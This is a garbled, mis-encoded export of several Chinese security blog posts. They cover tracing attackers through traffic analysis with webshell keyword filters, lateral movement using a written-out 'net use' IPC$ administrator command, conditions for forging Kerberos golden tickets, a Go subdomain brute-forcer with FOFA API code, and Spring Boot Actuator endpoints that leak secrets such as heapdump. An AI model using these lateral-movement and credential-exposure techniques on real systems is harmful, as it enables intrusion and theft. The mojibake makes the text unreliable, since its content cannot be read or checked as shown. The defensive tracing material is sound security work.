æº¯æºæº¯æºååˆ¶æ€è·¯a. æµé‡æº¯æºæ€è·¯:å¯åˆ©ç”¨æµé‡å·¥å…·è¿›è¡Œæº¯æºï¼š â…°. 1ã€æŸ¥çœ‹ evalã€z0ã€shellã€whoami ç­‰å…³é”®å­—ï¼ŒæŸ¥çœ‹å‡ºç°æ¬¡æ•°è¿‡å¤šçš„æ—¶å€™ï¼Œå¯èƒ½ éœ€è¦æŸ¥çœ‹æ˜¯å“ªä¸ª é¡µé¢å‘èµ·çš„è¯·æ±‚ï¼Œæœ‰å¯èƒ½æ˜¯ webshell â…±. 2ã€é€šè¿‡ WireShark å·¥å…·å¿«é€Ÿæœç´¢å…³é”®å­—ï¼Œå®šä½åˆ°å¼‚å¸¸æµé‡åŒ… â…². 3ã€æ‰¾å‡ºå¼‚å¸¸ IP å’Œæ‰€ä¸Šä¼ çš„å†…å®¹ï¼ŒæŸ¥çœ‹æ˜¯å¦ä¸º webshellb. èº«ä»½æº¯æºæ€è·¯ï¼š â…°. æ—ç«™æŸ¥è¯¢ â…±. ç½‘ç»œidå¸¦å…¥QQç¾¤æŸ¥è¯¢ æº¯æºæ€è·¯ æº¯æºçš„ç¬¬ä¸€æ­¥é€šè¿‡åŸŸåipåæŸ¥ç›®æ ‡çš„ä¸ªäººä¿¡æ¯ï¼Œä¸€èˆ¬é€šè¿‡å¾®æ­¥ç¤¾åŒºæˆ–è€…å¥‡å®‰ä¿¡å¨èƒæƒ…æŠ¥ä¸­å¿ƒå¯ä»¥æŸ¥è¯¢ï¼Œé€šè¿‡åŸŸåå¯ä»¥æŸ¥è¯¢whoisæ³¨å†Œä¿¡æ¯ï¼Œæˆ–è®¸å¯ä»¥è·å¾—ä¸€äº›é‚®ä»¶ç­‰ä¸€äº›ä¿¡æ¯ã€‚é€šè¿‡ç«™é•¿ä¹‹å®¶æŸ¥è¯¢ä¸‹å±åŸŸåã€‚å¦‚æœèƒ½æŸ¥åˆ°ä¸€äº›æ”»å‡»è€…ç›¸å…³IDå¯ä»¥é€šè¿‡ç¤¾äº¤è´¦å·è¿›è¡Œæœç´¢ã€‚æ”»å‡»è€…å¦‚æœä¸Šä¼ äº†æ”»å‡»ç¨‹åºï¼Œé€šè¿‡æ¶æ„ç¨‹åºåˆ†æç½‘ç«™æ¯”å¦‚å¾®æ­¥åœ¨çº¿äº‘æ²™ç®±ï¼Œè…¾è®¯å“ˆå‹ƒç­‰æ¥è¿›è¡Œåˆ†æã€‚ æµé‡æº¯æºåˆ†ææ€è·¯å¯åˆ©ç”¨æµé‡å·¥å…·è¿›è¡Œæº¯æºï¼š 1ã€æŸ¥çœ‹ evalã€z0ã€shellã€whoami ç­‰å…³é”®å­—ï¼ŒæŸ¥çœ‹å‡ºç°æ¬¡æ•°è¿‡å¤šçš„æ—¶å€™ï¼Œå¯èƒ½ éœ€è¦æŸ¥çœ‹æ˜¯å“ªä¸ª é¡µé¢å‘èµ·çš„è¯·æ±‚ï¼Œæœ‰å¯èƒ½æ˜¯ webshell 2ã€é€šè¿‡ WireShark å·¥å…·å¿«é€Ÿæœç´¢å…³é”®å­—ï¼Œå®šä½åˆ°å¼‚å¸¸æµé‡åŒ… 3ã€æ‰¾å‡ºå¼‚å¸¸ IP å’Œæ‰€ä¸Šä¼ çš„å†…å®¹ï¼ŒæŸ¥çœ‹æ˜¯å¦ä¸º webshell 3 å¦‚ä½•å®šä½åˆ°æ”»å‡»IP1ã€é¦–å…ˆé€šè¿‡é€‰æ‹© - ç»Ÿè®¡ - å¯¹è¯æŸ¥çœ‹æµé‡çš„èµ°å‘æƒ…å†µï¼Œå®šä½å¯ç–‘çš„ IP åœ°å€ 2ã€æ ¹æ®å®šä½åˆ°çš„ IP åœ°å€ï¼Œå°è¯•å¯¹ä¸Šä¼ çš„ webshell è¿›è¡Œå®šä½ ip.addr &#x3D;&#x3D;ip &amp;&amp;http matches â€œuploadleval|select|xp_cmdshellâ€&amp;&amp; http.request.method &#x3D;&#x3D; â€œPOSTâ€ 3ã€æŸ¥æ‰¾åˆ° Webshell åå°è¯•æº¯æºæ¼æ´ä½ç½®ï¼Œhttp.request.uri containsâ€œwebshell.phpâ€ï¼Œå®šä½åˆ°æœ€ å¼€å§‹ webshell æ‰§è¡Œæˆ–ä¸Šä¼ çš„æ—¶å€™ 4ã€æ ¹æ®æœ€å¼€å§‹çš„ HTTP ä¸Šä¼ åŒ…æˆ–è€…å…¶ä»–æ¼æ´ç‰¹äº§å®šä½æ¼æ´ç±» 5ã€é’ˆå¯¹æœåŠ¡å™¨ä¸­çš„æ—¥å¿—ï¼Œåˆ©ç”¨æ­£åˆ™æ¥å‘ç°ä¸€äº›å±é™©æ“ä½œçš„IP 6ã€ä½¿ç”¨wireshakeè¿›è¡Œæµé‡åˆ†æï¼Œæ‰¾åˆ°ä¸€äº›å±é™©æ“ä½œçš„IP 7ã€ä½¿ç”¨èœœç½è¿›è¡Œä¸€äº›è¯±å¯¼æ“ä½œ 8ã€æ‰¾åˆ°webshellè¿›è¡Œæº¯æºï¼Œå®šä½åˆ°webshellçš„ä¸Šä¼ æœåŠ¡å™¨ 9ã€ä¸€äº›é’“é±¼é‚®ä»¶æ²¡æœ‰ä¼ªè£…å¥½ï¼Œä¼šæš´éœ²è‡ªèº«çš„IPåœ°å€ 10ã€æœ‰äº›æ—¶å€™æœåŠ¡å™¨ä¸­è¢«ä¸Šä¼ äº†ä¸€äº›å·¥å…·ï¼Œå¯ä»¥æ ¹æ®ä¸€äº›å·¥å…·ï¼ˆå¯èƒ½æ˜¯å¯¹æ–¹è‡ªå†™ï¼‰æ¥è¿›è¡Œæœé›†ä¿¡æ¯ï¼Œæ¯”å¦‚å»githubçœ‹çœ‹ã€‚ 11ã€ç¤¾å·¥åº“ç­‰ã€‚ã€‚ã€‚ã€‚ 4 æº¯æºå¸¸ç”¨çš„å·¥å…·1ã€Rootkit æŸ¥æ€ï¼šhttp://www.chkrootkit.org 2ã€Clamav æŸ¥æ€ï¼šhttp://www.clamav.net/download.html â€‹\tClam AntiVirusæ˜¯ä¸€ä¸ªLinuxç³»ç»Ÿä¸Šä½¿ç”¨çš„åç—…æ¯’è½¯ä»¶åŒ…ã€‚ â€‹\tä¸»è¦åº”ç”¨äºé‚®ä»¶æœåŠ¡å™¨ï¼Œé‡‡ç”¨å¤šçº¿ç¨‹åå°æ“ä½œï¼Œå¯ä»¥è‡ªåŠ¨å‡çº§ç—…æ¯’åº“ã€‚\tyumå®‰è£… 3ã€æ²³é©¬ webshell æŸ¥æ€ï¼šhttp://www.shellpub.com æ·±ä¿¡æœ Webshell ç½‘ç«™åé—¨æ£€æµ‹å·¥å…·ï¼šhttp://edr.sangfor.com.cn/backdoor_detection.html å†…ç½‘æ¨ªå‘æ¸—é€å‘½ä»¤æ‰§è¡Œæ‰‹æ®µæˆ‘ä»¬å¯ä»¥é€šè¿‡ipcé“¾æ¥æ¥è¿›è¡Œä¸€ä¸ªæ¨ªå‘æ¸—é€å»ºç«‹ ipc$ è¿æ¥çš„æ¡ä»¶ï¼š ç›®æ ‡ä¸»æœºå¼€å¯äº†139å’Œ445ç«¯å£ ç›®æ ‡ä¸»æœºç®¡ç†å‘˜å¼€å¯äº†ipc$é»˜è®¤å…±äº« è¿™é‡Œæˆ‘ä»¬å·²çŸ¥ç”¨æˆ·åå’Œå¯†ç ï¼Œæˆ‘ä»¬æŒæ¡äº†ä¸€å°ä¸»æœºï¼Œç°åœ¨é€šè¿‡è¿™å°ä¸»æœºé“¾æ¥å®ƒåŸŸå†…çš„å¦ä¸€å° net use \\ç›®æ ‡ä¸»æœºIP\\ipc$ â€œå¯†ç â€ &#x2F;user:â€administratorâ€ é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®é»„é‡‘ç¥¨æ®Kerberosé»„é‡‘ç¥¨æ®æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡æ”»å‡»ç›®æ ‡ä¸»æœºçš„ Kerberos æœåŠ¡ï¼Œè·å–äº†æœ‰æ•ˆ TGT (Ticket-Granting Ticket) çš„å‡­è¯ï¼Œä»è€Œèƒ½å¤Ÿæœ‰æ•ˆç»•è¿‡å…¶ä»–ç³»ç»Ÿæ§åˆ¶æœºåˆ¶è€Œç›´æ¥è®¿é—®ç›®æ ‡ç³»ç»Ÿçš„æ‰€æœ‰èµ„æºã€‚æ”»å‡»è€…é€šå¸¸ä¼šåœ¨ç›®æ ‡ä¸»æœºä¸Šè¿è¡Œæ¶æ„è½¯ä»¶æˆ–ä½¿ç”¨å…¶ä»–æ¶æ„æ”»å‡»æ‰‹æ®µï¼Œé€šè¿‡æ”¶é›†ç³»ç»Ÿä¸­å­˜åœ¨çš„å‡­è¯æˆ–ä½¿ç”¨æš´åŠ›ç ´è§£ç­‰æ–¹å¼è·å–æœ‰æ•ˆ TGT å‡­è¯ã€‚ åˆ¶ä½œé‡‘ç¥¨çš„æ¡ä»¶ï¼š 1ã€åŸŸåç§° 2ã€åŸŸçš„SIDå€¼ 3ã€åŸŸçš„KRBTGTè´¦æˆ·å¯†ç HASH 4ã€ä¼ªé€ ç”¨æˆ·åï¼Œå¯ä»¥æ˜¯ä»»æ„çš„ ç™½é“¶ç¥¨æ®ç™½é“¶ç¥¨æ®æŒ‡çš„æ˜¯æ”»å‡»è€…é€šè¿‡è·å–å—å®³è€…ç³»ç»Ÿä¸­çš„æ™®é€šå‡­è¯ï¼Œç„¶ååˆ©ç”¨è¿™äº›å‡­è¯å°†è‡ªå·±ä¼ªè£…æˆæ™®é€šç”¨æˆ·å¹¶ä»¥ç”¨æˆ·æƒé™è¿è¡Œï¼Œä»è€Œè·å–å—å®³è€…ç³»ç»Ÿä¸­ä¸€éƒ¨åˆ†æ•æ„Ÿèµ„æºæˆ–ç‰¹æƒæ“ä½œçš„æ–¹å¼ã€‚ä¸é»„é‡‘ç¥¨æ®ä¸åŒï¼Œç™½é“¶ç¥¨æ®æ— æ³•ç›´æ¥ç»•è¿‡ç³»ç»Ÿä¿æŠ¤æœºåˆ¶æˆ–è·å–è¶…çº§ç®¡ç†å‘˜æƒé™ï¼Œä½†åˆ©ç”¨è¿™ç§ç¥¨æ®ï¼Œæ”»å‡»è€…ä»ç„¶å¯èƒ½å¯¹ç›®æ ‡ç³»ç»Ÿé€ æˆæŸå®³ã€‚ æ¯”å¦‚mimikazè¿™ç±»å¯ä»¥çªƒå–æ™®é€šå‡­è¯","tags":["ç½‘å®‰"],"categories":["æ‰“å·¥äººçš„ä¸‰ä¸¤äº‹"]},{"title":"go çº¢è“æ­¦å™¨åº“åŠŸèƒ½å¼€å‘","path":"/2025/02/13/go/å¼€å‘/åŠŸèƒ½å¼€å‘/","content":"å­åŸŸåçˆ†ç ´ os.Open(filename) æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ bufio.NewScanner(file) é€è¡Œè¯»å–å­åŸŸåã€‚ è¯»å–åˆ°çš„å­åŸŸåå‰ç¼€å­˜å…¥ subdomains åˆ‡ç‰‡ä¸­ï¼Œåç»­æ‹¼æ¥å®Œæ•´åŸŸåè¿›è¡ŒæŸ¥è¯¢ã€‚ 123456789101112131415func loadSubdomains(filename string) ([]string, error) &#123;\tfile, err := os.Open(filename)\tif err != nil &#123; return nil, err\t&#125;\tdefer file.Close()\tvar subdomains []string\tscanner := bufio.NewScanner(file)\tfor scanner.Scan() &#123; subdomains = append(subdomains, scanner.Text())\t&#125;\treturn subdomains, scanner.Err()&#125; å…ˆç®€å•å®ç°ä¸€ä¸ªå•çº¿ç¨‹çˆ†ç ´ç‰ˆæœ¬ï¼Œä»¥ baidu.com ä¸ºä¾‹ 123for _, subdomain := range subdomains &#123;\tdomain := subdomain + &quot;.baidu.com&quot;&#125; ç”¨ net åŒ…çš„LookupHostå‡½æ•°å®ç° DNS è§£æ 123456789func resolveSubdomain(subdomain string) &#123;\taddrs, err := net.LookupHost(subdomain)\tif err != nil &#123; return\t&#125;\tfor _, addr := range addrs &#123; fmt.Printf(&quot;[+] %s -&gt; %s &quot;, subdomain, addr)\t&#125;&#125; å¤§æ¦‚åŠŸèƒ½å®ç°åæˆ‘ä»¬å¯ä»¥ç»§ç»­ä¼˜åŒ– å¤šçº¿ç¨‹ â€‹\tâ€¢\té‡‡ç”¨ goroutines å¹¶è¡ŒæŸ¥è¯¢ï¼Œæé«˜çˆ†ç ´æ•ˆç‡ã€‚ â€‹\tâ€¢\tä½¿ç”¨ sync.WaitGroup ç¡®ä¿æ‰€æœ‰ä»»åŠ¡æ‰§è¡Œå®Œæˆåé€€å‡ºã€‚ â€‹\tâ€¢\tä½¿ç”¨ channel ä¼ é€’æŸ¥è¯¢ç»“æœï¼Œé˜²æ­¢æ•°æ®ç«äº‰ã€‚ 123456789ar wg sync.WaitGroup\tmaxthreads := 20\tsem := make(chan struct&#123;&#125;, maxthreads)\tfor _, subdomain := range subdomains &#123; domain := subdomain + &quot;.baidu.com&quot; wg.Add(1) go resolveSubdomain(domain, &amp;wg, sem)\t&#125; è¶…æ—¶æ§åˆ¶ DNS æŸ¥è¯¢å¯èƒ½å¡ä½ï¼Œå¯ä»¥ç”¨ context.WithTimeout() é™åˆ¶æ—¶é—´ï¼š 1234567891011func resolveSubdomain(subdomain string) &#123;\tctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)\tdefer cancel()\taddrs, err := net.DefaultResolver.LookupHost(ctx, subdomain)\tif err != nil &#123; return\t&#125;\tfor _, addr := range addrs &#123; fmt.Printf(&quot;[+] %s -&gt; %s &quot;, subdomain, addr)\t&#125;&#125; æŒ‡å®š DNS æœåŠ¡å™¨ å¯æŒ‡å®š Google å…¬å…± DNS è§£æï¼Œæé«˜å‡†ç¡®ç‡ï¼š 123456789ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)defer cancel()resolver := net.Resolver&#123;\tPreferGo: true,\tDial: func(ctx context.Context, network, address string) (net.Conn, error) &#123; d := net.Dialer&#123;Timeout: 3 * time.Second&#125; return d.DialContext(ctx, network, &quot;8.8.8.8:53&quot;)\t&#125;,&#125; å®Œæ•´ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package mainimport (\t&quot;bufio&quot;\t&quot;fmt&quot;\t&quot;golang.org/x/net/context&quot;\t&quot;net&quot;\t&quot;os&quot;\t&quot;sync&quot;\t&quot;time&quot;)func loadSubdomains(filename string) ([]string, error) &#123;\tfile, err := os.Open(filename)\tif err != nil &#123; return nil, err\t&#125;\tdefer file.Close()\tvar subdomains []string\tscanner := bufio.NewScanner(file)\tfor scanner.Scan() &#123; subdomains = append(subdomains, scanner.Text())\t&#125;\treturn subdomains, scanner.Err()&#125;func resolveSubdomain(subdomain string, wg *sync.WaitGroup, sem chan struct&#123;&#125;) &#123;\tdefer wg.Done()\tsem &lt;- struct&#123;&#125;&#123;&#125;\tdefer func() &#123; &lt;-sem &#125;()\tctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)\tdefer cancel()\tresolver := net.Resolver&#123; PreferGo: true, Dial: func(ctx context.Context, network, address string) (net.Conn, error) &#123; d := net.Dialer&#123;Timeout: 3 * time.Second&#125; return d.DialContext(ctx, network, &quot;8.8.8.8:53&quot;) &#125;,\t&#125;\taddrs, err := resolver.LookupHost(ctx, subdomain)\tif err != nil &#123; return\t&#125;\tfor _, addr := range addrs &#123; fmt.Printf(&quot;[+] %s -&gt; %s &quot;, subdomain, addr)\t&#125;&#125;func main() &#123;\tsubdomains, err := loadSubdomains(&quot;subdomains.txt&quot;)\tif err != nil &#123; panic(err)\t&#125;\tvar wg sync.WaitGroup\tmaxthreads := 20\tsem := make(chan struct&#123;&#125;, maxthreads)\tfor _, subdomain := range subdomains &#123; domain := subdomain + &quot;.baidu.com&quot; wg.Add(1) go resolveSubdomain(domain, &amp;wg, sem)\t&#125;\twg.Wait()\t// è®¡ç®—æ—¶é—´\tstart := time.Now()\tfmt.Println(&quot;Time:&quot;, time.Since(start))&#125; å¯¼å‡ºæ–‡ä»¶è¾“å‡ºç»“æœå›æ˜¾åœ¨å‰ç«¯ç›´è§‚ï¼Œä½†æ˜¯ä¸å¥½æ“ä½œæ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ·»åŠ ä¸€ä¸ªå¯¼å‡ºåŠŸèƒ½ï¼Œæˆ‘æ›´åå‘äºå¯¼å‡º csv æ–‡ä»¶ï¼Œè®¾è®¡ä¸¤ä¸ªå­—æ®µï¼Œä¸€ä¸ªåŸŸåï¼Œä¸€ä¸ªå¯¹åº”çš„ ipï¼Œè¿™é‡Œåªä¿ç•™ ipv4ï¼Œä½¿ç”¨çš„æ˜¯ gocsv åº“ 1go get -u github.com/gocarina/gocsv 123456789101112131415161718192021222324252627282930type ExportedSubdomain struct &#123;\tName string `csv:&quot;åŸŸå&quot;`\tIP string `csv:&quot;IP&quot;`\tTime string `csv:&quot;æ—¶é—´&quot;`&#125;func ExportResults(s *Subdomain) error &#123;\tfilename := s.Domain + &quot;.csv&quot;\tfile, err := os.OpenFile(&quot;./output/subdomain/&quot;+filename, os.O_CREATE|os.O_WRONLY, 0644)\tif err != nil &#123; panic(err)\t&#125;\tdefer file.Close()\tsubdomains := []*ExportedSubdomain&#123;&#125;\t// éå† s.Resultsï¼Œå°†ç»“æœè½¬æ¢ä¸º ExportedSubdomain ç»“æ„ä½“\tfor _, result := range s.Results &#123; result = strings.TrimPrefix(result, &quot;[+] &quot;) parts := strings.Split(result, &quot; -&gt; &quot;) subdomains = append(subdomains, &amp;ExportedSubdomain&#123; Name: parts[0], IP: parts[1], Time: time.Now().Format(&quot;2006-01-02 15:04:05&quot;), &#125;)\t&#125;\terr = gocsv.MarshalFile(&amp;subdomains, file) // Use this to save the CSV back to the file\tif err != nil &#123; panic(err)\t&#125;\treturn nil&#125; è¿›åº¦æ¡å®æ—¶æ›´æ–°è¿™å°±è¦ç”¨åˆ° Events äº‹ä»¶ æ¥ä¾¦å¬äº†ã€‚ åç«¯ 1runtime.EventsEmit(s.ctx, &quot;subdomain-progress&quot;, percentage) å‰ç«¯ 12345678910111213141516171819// åœ¨ç»„ä»¶æŒ‚è½½æ—¶å¼€å§‹ç›‘å¬äº‹ä»¶onMounted(() =&gt; &#123; EventsOn(&#x27;subdomain-progress&#x27;, (percentage) =&gt; &#123; console.log(9999) console.log(percentage) progress.value = percentage &#125;) EventsOn(&#x27;subdomain-done&#x27;, (time) =&gt; &#123; console.log(&#x27;Scanning done in&#x27;, time) loading.value = false &#125;)&#125;)// åœ¨ç»„ä»¶å¸è½½æ—¶åœæ­¢ç›‘å¬äº‹ä»¶onUnmounted(() =&gt; &#123; EventsOff(&#x27;subdomain-progress&#x27;) EventsOff(&#x27;subdomain-done&#x27;)&#125;) è°ƒç”¨ fofa apiè·å–ç”¨æˆ·ä¿¡æ¯æŸ¥ä¸€ä¸‹ fofa å®˜æ–¹æ–‡æ¡£ https://fofa.info/api/info 1234type Fofa_Client struct &#123; email string key string&#125; å†å†™ä¸€ä¸ªå®ç°æ–¹æ³• 123456func New_Fofa_Client(email string, key string) *Fofa_Client &#123;\treturn &amp;Fofa_Client&#123; email: email, key: key,\t&#125;&#125; å®˜ç½‘ç»™çš„å“åº”å®ä¾‹ 123456789101112131415161718&#123; &quot;error&quot;: false, // æ˜¯å¦å‡ºç°é”™è¯¯ &quot;email&quot;: &quot;fo****t@baimaohui.net&quot;, // é‚®ç®±åœ°å€ï¼š &quot;username&quot;: &quot;fofabot&quot;, // ç”¨æˆ·å &quot;category&quot;: &quot;user&quot;, // ç”¨æˆ·ç§ç±» &quot;fcoin&quot;: 0, // Få¸ &quot;fofa_point&quot;: 49200, // Fç‚¹ &quot;remain_free_point&quot;: 0, // å‰©ä½™å…è´¹Fç‚¹ &quot;remain_api_query&quot;: 49992, // APIæœˆåº¦å‰©ä½™æŸ¥è¯¢æ¬¡æ•° &quot;remain_api_data&quot;: 499398, // APIæœˆåº¦å‰©ä½™è¿”å›æ•°é‡ &quot;isvip&quot;: true, // æ˜¯å¦æ˜¯ä¼šå‘˜ &quot;vip_level&quot;: 12, // page.api.whether.level &quot;is_verified&quot;: false, &quot;avatar&quot;: &quot;https://nosec.org/missing.jpg&quot;, &quot;message&quot;: &quot;&quot;, &quot;fofacli_ver&quot;: &quot;4.0.3&quot;, &quot;fofa_server&quot;: true&#125; å®šä¹‰æ¥æ”¶ç±»å‹ 123456789101112131415161718type Fofa_API_Info struct &#123;\tError bool `json:&quot;error&quot;`\tEmail string `json:&quot;email&quot;`\tUsername string `json:&quot;username&quot;`\tCategory string `json:&quot;category&quot;`\tFcoin int `json:&quot;fcoin&quot;`\tFofaPoint int `json:&quot;fofa_point&quot;`\tRemainFreePoint int `json:&quot;remain_free_point&quot;`\tRemainApiQuery int `json:&quot;remain_api_query&quot;`\tRemainApiData int `json:&quot;remain_api_data&quot;`\tIsvip bool `json:&quot;isvip&quot;`\tVipLevel int `json:&quot;vip_level&quot;`\tIsVerified bool `json:&quot;is_verified&quot;`\tAvatar string `json:&quot;avatar&quot;`\tMessage string `json:&quot;message&quot;`\tFofacliVer string `json:&quot;fofacli_ver&quot;`\tFofaServer bool `json:&quot;fofa_server&quot;`&#125; å®ç°æ–¹æ³• 123456789101112131415161718192021func (fofa_client *Fofa_Client) API_Info() (*Fofa_API_Info, error) &#123;\tBaseURL := &quot;https://fofa.info/api/v1/&quot;\turl := BaseURL + &quot;info/my&quot;\tclient := req.C()\tres, err := client.R().SetQueryParams(map[string]string&#123; &quot;email&quot;: fofa_client.email, &quot;key&quot;: fofa_client.key,\t&#125;).Get(url)\tif err != nil &#123; return nil, err\t&#125;\tvar ret Fofa_API_Info\terr = json.Unmarshal(res.Bytes(), &amp;ret)\tif err != nil &#123; return nil, err\t&#125;\treturn &amp;ret, nil&#125; å®Œæ•´ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172package mainimport (\t&quot;encoding/json&quot;\t&quot;fmt&quot;\t&quot;github.com/imroc/req/v3&quot;)type Fofa_Client struct &#123;\temail string\tkey string&#125;type Fofa_API_Info struct &#123;\tError bool `json:&quot;error&quot;`\tEmail string `json:&quot;email&quot;`\tUsername string `json:&quot;username&quot;`\tCategory string `json:&quot;category&quot;`\tFcoin int `json:&quot;fcoin&quot;`\tFofaPoint int `json:&quot;fofa_point&quot;`\tRemainFreePoint int `json:&quot;remain_free_point&quot;`\tRemainApiQuery int `json:&quot;remain_api_query&quot;`\tRemainApiData int `json:&quot;remain_api_data&quot;`\tIsvip bool `json:&quot;isvip&quot;`\tVipLevel int `json:&quot;vip_level&quot;`\tIsVerified bool `json:&quot;is_verified&quot;`\tAvatar string `json:&quot;avatar&quot;`\tMessage string `json:&quot;message&quot;`\tFofacliVer string `json:&quot;fofacli_ver&quot;`\tFofaServer bool `json:&quot;fofa_server&quot;`&#125;func New_Fofa_Client(email string, key string) *Fofa_Client &#123;\treturn &amp;Fofa_Client&#123; email: email, key: key,\t&#125;&#125;func (fofa_client *Fofa_Client) API_Info() (*Fofa_API_Info, error) &#123;\tBaseURL := &quot;https://fofa.info/api/v1/&quot;\turl := BaseURL + &quot;info/my&quot;\tclient := req.C()\tres, err := client.R().SetQueryParams(map[string]string&#123; &quot;email&quot;: fofa_client.email, &quot;key&quot;: fofa_client.key,\t&#125;).Get(url)\tif err != nil &#123; return nil, err\t&#125;\tvar ret Fofa_API_Info\terr = json.Unmarshal(res.Bytes(), &amp;ret)\tif err != nil &#123; return nil, err\t&#125;\treturn &amp;ret, nil&#125;func main() &#123;\tclient := New_Fofa_Client(&quot;xxxx@qq.com&quot;, &quot;xxxxxx&quot;)\tinfo, err := client.API_Info()\tif err != nil &#123; panic(err)\t&#125; else &#123; fmt.Println( &quot;Email:&quot;, info.Email, &quot;Username:&quot;, info.Username, )\t&#125;&#125; è·å–ä¸»æœºä¿¡æ¯123456789101112131415161718192021222324252627282930313233343536373839404142type Fofa_Info_Search_Host struct &#123;\tError bool `json:&quot;error&quot;`\tSize int `json:&quot;size&quot;`\tPage int `json:&quot;page&quot;`\tMode string `json:&quot;mode&quot;`\tQuery string `json:&quot;query&quot;`\tResults [][]string `json:&quot;results&quot;`&#125;func New_Fofa_Info_Search(q string) *Fofa_Info_Search &#123;\treturn &amp;Fofa_Info_Search&#123; Qbase64: q, Fields: &quot;no&quot;, Page: 1, Size: 5, Full: false,\t&#125;&#125;func (fofa_client *Fofa_Client) Info_Search(q string) (*Fofa_Info_Search_Host, error) &#123;\tBaseURL := &quot;https://fofa.info/api/v1/&quot;\turl := BaseURL + &quot;search/all&quot;\tclient := req.C()\tres, err := client.R().SetQueryParams(map[string]string&#123; &quot;email&quot;: fofa_client.email, &quot;key&quot;: fofa_client.key, &quot;qbase64&quot;: q,\t&#125;).Get(url)\tif err != nil &#123; return nil, err\t&#125;\tvar ret Fofa_Info_Search_Host\terr = json.Unmarshal(res.Bytes(), &amp;ret)\tif err != nil &#123; return nil, err\t&#125;\treturn &amp;ret, nil&#125;","tags":["go å¼€å‘"],"categories":["å¼€å‘"]},{"title":"SpringBoot æ³„æ¼","path":"/2024/12/11/src/SpringBoot æ³„æ¼/","content":"Actuator æ³„æ¼ Spring Boot Actuator æ˜¯ä¸€ä¸ªå¼ºå¤§çš„ç›‘æ§å’Œç®¡ç†æ¡†æ¶ï¼Œå®ƒæä¾›äº†ä¸€ç³»åˆ—çš„ç›‘æ§ç«¯ç‚¹ï¼Œå¯ä»¥ç”¨äºè·å–åº”ç”¨ç¨‹åºçš„çŠ¶æ€ã€åº¦é‡æŒ‡æ ‡ã€å¥åº·æ£€æŸ¥ã€é…ç½®ä¿¡æ¯ç­‰ã€‚Actuator çš„ç›‘æ§ç«¯ç‚¹å¯ä»¥é€šè¿‡ HTTP è¯·æ±‚è®¿é—®ï¼Œå¹¶è¿”å›æœ‰å…³åº”ç”¨ç¨‹åºè¿è¡Œæ—¶ä¿¡æ¯çš„å“åº”ã€‚ ä½¿ç”¨ Actuator å¯ä»¥æ–¹ä¾¿åœ°äº†è§£åº”ç”¨ç¨‹åºçš„è¿è¡ŒçŠ¶å†µï¼Œç›‘æ§å…³é”®æŒ‡æ ‡ï¼Œå¹¶æ ¹æ®éœ€è¦é‡‡å–ç›¸åº”çš„æªæ–½ã€‚å®ƒä¸ºå¼€å‘äººå‘˜å’Œè¿ç»´äººå‘˜æä¾›äº†ä¸€ç§ç®€å•è€Œæœ‰æ•ˆçš„æ–¹å¼æ¥ç›‘æ§å’Œç®¡ç† Spring Boot åº”ç”¨ç¨‹åºã€‚ https://www.freebuf.com/vuls/407651.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869/actuatoræŸ¥çœ‹æœ‰å“ªäº› Actuatorç«¯ç‚¹æ˜¯å¼€æ”¾çš„ã€‚/actuator/auditeventauditeventsç«¯ç‚¹æä¾›æœ‰å…³åº”ç”¨ç¨‹åºå®¡è®¡äº‹ä»¶çš„ä¿¡æ¯ã€‚/actuator/beansbeansç«¯ç‚¹æä¾›æœ‰å…³åº”ç”¨ç¨‹åº bean çš„ä¿¡æ¯ã€‚/actuator/conditionsconditionsç«¯ç‚¹æä¾›æœ‰å…³é…ç½®å’Œè‡ªåŠ¨é…ç½®ç±»æ¡ä»¶è¯„ä¼°çš„ä¿¡æ¯ã€‚/actuator/configpropsconfigpropsç«¯ç‚¹æä¾›æœ‰å…³åº”ç”¨ç¨‹åº@ConfigurationPropertiesbeançš„ä¿¡æ¯ã€‚/actuator/env æŸ¥çœ‹å…¨éƒ¨ç¯å¢ƒå±æ€§ï¼Œå¯ä»¥çœ‹åˆ° SpringBoot è½½å…¥å“ªäº› propertiesï¼Œä»¥åŠ properties çš„å€¼ï¼ˆä¼šè‡ªåŠ¨ç”¨*æ›¿æ¢ keyã€passwordã€secret ç­‰å…³é”®å­—çš„ properties çš„å€¼ï¼‰ã€‚/actuator/flywayflywayç«¯ç‚¹æä¾›æœ‰å…³ Flyway æ‰§è¡Œçš„æ•°æ®åº“è¿ç§»çš„ä¿¡æ¯ã€‚/actuator/health ç«¯ç‚¹æä¾›æœ‰å…³åº”ç”¨ç¨‹åºè¿è¡ŒçŠ¶å†µçš„healthè¯¦ç»†ä¿¡æ¯ã€‚/actuator/heapdumpheapdumpç«¯ç‚¹æä¾›æ¥è‡ªåº”ç”¨ç¨‹åº JVM çš„å †è½¬å‚¨ã€‚(é€šè¿‡åˆ†ææŸ¥çœ‹/envç«¯ç‚¹è¢«*å·æ›¿æ¢åˆ°æ•°æ®çš„å…·ä½“å€¼ã€‚)/actuator/httptracehttptraceç«¯ç‚¹æä¾›æœ‰å…³ HTTP è¯·æ±‚-å“åº”äº¤æ¢çš„ä¿¡æ¯ã€‚ï¼ˆåŒ…æ‹¬ç”¨æˆ·HTTPè¯·æ±‚çš„Cookieæ•°æ®ï¼Œä¼šé€ æˆCookieæ³„éœ²ç­‰ï¼‰ã€‚/actuator/infoinfoç«¯ç‚¹æä¾›æœ‰å…³åº”ç”¨ç¨‹åºçš„ä¸€èˆ¬ä¿¡æ¯ã€‚/actuator/integrationgraphintegrationgraphç«¯ç‚¹å…¬å¼€äº†ä¸€ä¸ªåŒ…å«æ‰€æœ‰ Spring Integration ç»„ä»¶çš„å›¾ã€‚/actuator/liquibaseliquibaseç«¯ç‚¹æä¾›æœ‰å…³ Liquibase 